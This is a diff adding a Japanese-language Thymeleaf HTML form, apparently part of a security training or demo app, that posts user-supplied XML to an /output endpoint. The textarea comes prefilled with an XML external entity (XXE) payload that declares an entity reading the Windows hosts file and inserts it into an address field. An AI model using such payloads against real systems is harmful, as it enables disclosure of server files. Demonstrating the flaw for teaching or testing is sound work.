@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html xmlns="https://www.thymeleaf.org" lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Input</title>
+  </head>
+  <body>
+    <h1>XMLファイルを指定してください</h1>
+    <form action="#" th:action="@{/output}" method="post">
+      <textarea name="xml" cols="40" rows="5">
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
+&lt;!DOCTYPE name [
+&lt;!ENTITY hosts SYSTEM "C:\Windows\System32\drivers\etc\hosts"&gt;
+]&gt;
+&lt;user&gt;&lt;name&gt;安全太郎&lt;/name&gt;
+&lt;address&gt;&amp;hosts;&lt;/address&gt;&lt;/user&gt;
+    </textarea
+      >
+      <input type="submit" />
+    </form>
+  </body>
+</html>
